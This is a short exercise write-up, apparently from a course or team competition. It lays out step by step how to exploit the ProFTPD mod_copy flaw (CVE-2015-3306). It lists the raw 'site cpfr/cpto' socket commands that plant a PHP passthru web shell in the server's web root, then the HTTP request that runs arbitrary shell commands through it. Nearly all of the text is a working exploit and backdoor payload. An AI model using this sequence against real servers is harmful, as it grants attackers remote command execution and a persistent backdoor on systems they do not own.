## Stage One - pwning system
Create script to exploit vulnerability in given server.

### Steps to exploit
Create socket connection with given server

Send utf-8 encoded commands via socket:

`site cpfr /proc/self/cmdline\n`

`site cpto /tmp/.<?php echo passthru($_GET['cmd']); ?>\n`

`site cpfr /tmp/.<?php echo passthru($_GET['cmd']); ?>\n`

`site cpto /var/www/html/backdoor_teamName.php\n`

Send HTTP GET request to server with any bash command

`http://SERVER_IP/backdoor_teamName.php?cmd=whoami`

### References
1. http://www.cs.put.poznan.pl/csobaniec/software/python/py-qrc.html
2. https://www.cvedetails.com/cve/cve-2015-3306
